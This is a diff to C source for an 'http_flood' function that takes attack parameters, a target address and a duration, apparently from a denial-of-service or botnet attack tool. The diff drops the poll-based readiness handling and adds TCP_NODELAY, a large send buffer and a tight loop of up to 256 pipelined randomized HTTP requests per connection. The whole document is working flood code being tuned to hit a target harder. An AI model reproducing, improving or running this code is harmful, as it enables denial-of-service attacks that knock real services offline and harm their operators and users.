@@ -11,6 +11,7 @@
 #include <sys/socket.h>
 #include <sys/epoll.h>
 #include <arpa/inet.h>
+#include <netinet/tcp.h>
 
 #include "http_method.h"
 #include "http_common.h"
@@ -137,9 +138,6 @@ static void* http_flood(attack_params* params) {
     http_conn_t* conns = (http_conn_t*)calloc(max_conns, sizeof(http_conn_t));
     if (!conns) return NULL;
 
-    struct pollfd* pfds = (struct pollfd*)malloc(max_conns * sizeof(struct pollfd));
-    if (!pfds) { free(conns); return NULL; }
-
     struct sockaddr_in target;
     memcpy(&target, &params->target_addr, sizeof(target));
 
@@ -237,7 +235,6 @@ static void* http_flood(attack_params* params) {
     if (!request || !discard) {
         if (request) free(request);
         if (discard) free(discard);
-        free(pfds);
         free(conns);
         return NULL;
     }
@@ -262,15 +259,21 @@ static void* http_flood(attack_params* params) {
     }
     
     time_t end_time = time(NULL) + params->duration;
+    int sndbuf = 262144;
+    int nodelay = 1;
 
     attack_rand_init();
 
     while (params->active && time(NULL) < end_time) {
+        if (total_pipe_len <= 0) break;
+
         for (int i = 0; i < max_conns && params->active; i++) {
             if (conns[i].fd <= 0) {
                 int fd = socket(AF_INET, SOCK_STREAM, 0);
                 if (fd < 0) continue;
 
+                setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &nodelay, sizeof(nodelay));
+                setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
                 http_set_nonblocking(fd);
 
                 int ret = connect(fd, (struct sockaddr*)&target, sizeof(target));
@@ -284,49 +287,26 @@ static void* http_flood(attack_params* params) {
             }
         }
 
-        int nfds = 0;
-        int poll_map[MAX_CONNECTIONS];
-        for (int i = 0; i < max_conns; i++) {
-            if (conns[i].fd > 0) {
-                pfds[nfds].fd = conns[i].fd;
-                pfds[nfds].events = POLLOUT;
-                pfds[nfds].revents = 0;
-                poll_map[nfds] = i;
-                nfds++;
-            }
-        }
-
-        if (nfds > 0) poll(pfds, nfds, 0);
-
-        randomize_placeholders(request, pipe_offsets, pipe_off_cnt);
-
-        for (int j = 0; j < nfds && params->active; j++) {
-            int i = poll_map[j];
+        for (int i = 0; i < max_conns && params->active; i++) {
             if (conns[i].fd <= 0) continue;
 
-            if (pfds[j].revents & (POLLERR | POLLHUP | POLLNVAL)) {
-                close(conns[i].fd);
-                conns[i].fd = 0;
-                conns[i].state = 0;
-                continue;
+            for (int k = 0; k < 256; k++) {
+                randomize_placeholders(request, pipe_offsets, pipe_off_cnt);
+                ssize_t sent = send(conns[i].fd, request, total_pipe_len, MSG_NOSIGNAL | MSG_DONTWAIT);
+                if (sent > 0) continue;
+                if (sent < 0) {
+                    if (errno == EAGAIN || errno == EWOULDBLOCK) break;
+                    if (errno == EINPROGRESS || errno == ENOTCONN) break;
+                    close(conns[i].fd);
+                    conns[i].fd = 0;
+                    conns[i].state = 0;
+                }
+                break;
             }
 
-            if (!(pfds[j].revents & POLLOUT)) continue;
-
-            if (conns[i].state == 1) conns[i].state = 2;
-
-            if (total_pipe_len <= 0) continue;
-
-            ssize_t sent = send(conns[i].fd, request, total_pipe_len, MSG_NOSIGNAL | MSG_DONTWAIT);
-
-            if (sent < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
-                close(conns[i].fd);
-                conns[i].fd = 0;
-                conns[i].state = 0;
-                continue;
+            if (conns[i].fd > 0) {
+                recv(conns[i].fd, discard, 4096, MSG_DONTWAIT);
             }
-
-            recv(conns[i].fd, discard, 4096, MSG_DONTWAIT);
         }
     }
     
@@ -337,7 +317,6 @@ static void* http_flood(attack_params* params) {
     }
     free(request);
     free(discard);
-    free(pfds);
     free(conns);
     
     return NULL;
